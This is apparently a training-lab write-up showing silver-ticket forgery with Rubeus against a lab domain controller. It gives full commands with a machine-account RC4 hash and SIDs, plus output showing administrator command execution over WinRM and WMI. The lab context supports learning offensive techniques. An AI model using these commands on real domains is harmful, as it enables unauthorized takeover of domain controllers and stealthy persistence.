# Learning Objective 09 (Silver Ticket Attack for Persistence)

## Tasks

1. **Try to get command execution on the domain controller by creating silver ticket for:**
	- **HTTP**
	- **WMI**

---

## Solution

1. **Try to get command execution on the domain controller by creating silver ticket for HTTP service and WMI service**

From the information gathered in the previous steps (see *Learning Objective 07*) we have the hash for the machine account of the domain controller (`dcorp-dc$`).

**Note that we are NOT using the `krbtgt` hash here**.

Using the below command, we can create a silver ticket that provides us access to the HTTP service (WinRM) on DC.

Please note that the hash of `dcorp-dc$` (RC4 in the below command) may be different in your lab instance. **You can also use aes256 keys in place of NTLM hash.**

**HTTP Service**

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`whoami /groups`:
```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes

========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators👥                   Alias            S-1-5-32-544                                  Group used for deny only❌
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
dcorp\RDPUsers                             Group            S-1-5-21-719815819-3726368948-3917688648-1123 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:68d6c096c7cfee52a45d6207489526bc /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt`:
```
[SNIP]

[*] Action: Build TGS📌

[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 68D6C096C7CFEE52A45D6207489526BC
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : http📌
[*] Target         : dcorp-dc.dollarcorp.moneycorp.local📌

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator'🎭 to 'http/dcorp-dc.dollarcorp.moneycorp.local'

[*] AuthTime       : 2/13/2025 5:01:30 AM
[*] StartTime      : 2/13/2025 5:01:30 AM
[*] EndTime        : 2/13/2025 3:01:30 PM
[*] RenewTill      : 2/20/2025 5:01:30 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

We can check if we got the correct service ticket.

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist`:
```
[SNIP]

Action: List Kerberos Tickets (Current User)

[*] Current LUID    : 0x848e43

  UserName                 : student422
  Domain                   : dcorp
  LogonId                  : 0x848e43
  UserSID                  : S-1-5-21-719815819-3726368948-3917688648-20607
  AuthenticationPackage    : Negotiate
  LogonType                : RemoteInteractive
  LogonTime                : 2/12/2025 5:47:16 AM
  LogonServer              : DCORP-DC
  LogonServerDNSDomain     : DOLLARCORP.MONEYCORP.LOCAL
  UserPrincipalName        : student422@dollarcorp.moneycorp.local

    [0] - 0x17 - rc4_hmac
      Start/End/MaxRenew: 2/13/2025 5:01:30 AM ; 2/13/2025 3:01:30 PM ; 2/20/2025 5:01:30 AM
      Server Name       : http📌/dcorp-dc.dollarcorp.moneycorp.local📌 @ DOLLARCORP.MONEYCORP.LOCAL
      Client Name       : Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
      Flags             : pre_authent, renewable, forwardable (40a00000)
```

`klist`:
```
Current LogonId is 0:0x848e43

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: http📌/dcorp-dc.dollarcorp.moneycorp.local📌 @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 2/13/2025 5:01:30 (local)
        End Time:   2/13/2025 15:01:30 (local)
        Renew Time: 2/20/2025 5:01:30 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

We have the HTTP service ticket for `dcorp-dc`, let’s try accessing it using winrs.

**Note that we are using FQDN of `dcorp-dc`** as that is what the service ticket has.

`winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd`:
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
```
🚀

![dcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
dcorp\administrator
```

`hostname`:
```
dcorp-dc
```
🚩

**WMI Service**

**For accessing WMI, we need to create two TGS tickets: one for HOST service and another for RPCSS.**

Run the below commands **from an elevated shell**.

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`whoami /groups`:
```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes

========================================== ================ ============================================= ===============================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators👥                   Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner✅
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
dcorp\RDPUsers                             Group            S-1-5-21-719815819-3726368948-3917688648-1123 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

Inject a ticket for HOST service.

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:68d6c096c7cfee52a45d6207489526bc /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt`:
```
[SNIP]

[*] Action: Build TGS📌

[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 68D6C096C7CFEE52A45D6207489526BC
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : host📌
[*] Target         : dcorp-dc.dollarcorp.moneycorp.local📌

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator'🎭 to 'host/dcorp-dc.dollarcorp.moneycorp.local'

[*] AuthTime       : 2/13/2025 5:10:56 AM
[*] StartTime      : 2/13/2025 5:10:56 AM
[*] EndTime        : 2/13/2025 3:10:56 PM
[*] RenewTill      : 2/20/2025 5:10:56 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

Inject a ticket for RPCSS service.

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:68d6c096c7cfee52a45d6207489526bc /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt`:
```
[SNIP]

[*] Action: Build TGS📌

[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 68D6C096C7CFEE52A45D6207489526BC
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 68D6C096C7CFEE52A45D6207489526BC
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : rpcss📌
[*] Target         : dcorp-dc.dollarcorp.moneycorp.local📌

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator'🎭 to 'rpcss/dcorp-dc.dollarcorp.moneycorp.local'

[*] AuthTime       : 2/13/2025 5:11:23 AM
[*] StartTime      : 2/13/2025 5:11:23 AM
[*] EndTime        : 2/13/2025 3:11:23 PM
[*] RenewTill      : 2/20/2025 5:11:23 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

Check if the tickets are present.

`klist`:
```
[SNIP]

Current LogonId is 0:0x848dc4

Cached Tickets: (2)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: rpcss📌/dcorp-dc.dollarcorp.moneycorp.local📌 @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 2/13/2025 5:07:08 (local)
        End Time:   2/13/2025 15:07:08 (local)
        Renew Time: 2/20/2025 5:07:08 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

#1>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: host📌/dcorp-dc.dollarcorp.moneycorp.local📌 @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 2/13/2025 5:05:47 (local)
        End Time:   2/13/2025 15:05:47 (local)
        Renew Time: 2/20/2025 5:05:47 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

[SNIP]
```

Now, try running WMI commands on the domain controller.

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc`:
```
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348📌
```
🚩

---
---
